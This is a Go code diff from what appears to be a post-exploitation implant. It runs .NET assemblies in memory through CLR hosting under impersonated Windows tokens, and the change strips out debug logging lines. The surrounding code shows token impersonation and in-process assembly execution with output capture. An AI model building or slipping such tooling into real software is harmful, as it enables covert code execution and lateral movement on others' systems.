@@ -95,33 +95,25 @@ func applyTokenContextForInlineAssembly() func() {
 
 	// Priority: Network-only token > Regular impersonation
 	if globalTokenStore.NetOnlyHandle != 0 {
-		fmt.Printf("[Inline Assembly Token] Applying network-only token '%s' for assembly execution\n",
-			globalTokenStore.NetOnlyToken)
 
 		// Apply the network-only token
 		err := ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle)
 		if err == nil {
 			cleanupFunc = func() {
 				RevertToSelf()
-				fmt.Printf("[Inline Assembly Token] Reverted network-only token after assembly execution\n")
 			}
 		} else {
-			fmt.Printf("[Inline Assembly Token] Failed to apply network-only token: %v\n", err)
 		}
 	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
 		// Look up the token in the global store
 		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
-			fmt.Printf("[Inline Assembly Token] Applying impersonation token '%s' for assembly execution\n",
-				globalTokenStore.ActiveToken)
 
 			err := ImpersonateLoggedOnUser(token)
 			if err == nil {
 				cleanupFunc = func() {
 					RevertToSelf()
-					fmt.Printf("[Inline Assembly Token] Reverted impersonation token after assembly execution\n")
 				}
 			} else {
-				fmt.Printf("[Inline Assembly Token] Failed to apply impersonation token: %v\n", err)
 			}
 		}
 	}
@@ -333,7 +325,6 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	fmt.Println("[DEBUG] Creating pipe")
 	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
 	if err != nil {
-		fmt.Printf("[DEBUG] Failed to create pipe: %v\n", err)
 		// Detect runtime version
 		targetRuntime := "v4"
 		if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
@@ -384,7 +375,6 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	fmt.Println("[DEBUG] Executing assembly")
 	// Execute the assembly
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-	fmt.Printf("[DEBUG] Assembly executed: retCode=%d, err=%v\n", retCode, execErr)
 
 	// Close write pipe to signal EOF
 	fmt.Println("[DEBUG] Closing write pipe")
@@ -410,11 +400,9 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 		)
 
 		if ret == 0 || bytesAvail == 0 {
-			fmt.Printf("[DEBUG] No more data available\n")
 			break
 		}
 
-		fmt.Printf("[DEBUG] %d bytes available in pipe\n", bytesAvail)
 
 		// Read the available data
 		ret, _, _ = readFile.Call(
@@ -427,7 +415,6 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 
 		if ret != 0 && bytesRead > 0 {
 			output.Write(buffer[:bytesRead])
-			fmt.Printf("[DEBUG] Read %d bytes\n", bytesRead)
 		} else {
 			break
 		}
@@ -474,7 +461,6 @@ func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, i
 	// Test 1: Can we execute at all?
 	fmt.Println("[DEBUG TEST] Test 1: Direct execution")
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-	fmt.Printf("[DEBUG TEST] Direct execution result: code=%d, err=%v\n", retCode, execErr)
 
 	// The output we saw earlier suggests the assembly IS running
 	// but Console.WriteLine is going somewhere else
